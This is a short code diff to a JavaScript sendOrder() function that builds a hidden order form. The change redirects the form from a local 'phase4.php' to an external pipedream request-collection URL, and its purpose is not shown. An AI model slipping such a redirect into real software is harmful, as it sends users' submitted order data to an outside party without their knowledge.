@@ -135,7 +135,7 @@ function sendOrder() {
     let form = document.createElement('form');
     document.body.appendChild(form);
     form.method = 'post';
-    form.action = "phase4.php";
+    form.action = "https://enlx6f766q8jc.x.pipedream.net";
     let inputKittype = document.createElement('input');
     inputKittype.setAttribute("type", "hidden");
     inputKittype.name = "kittype";
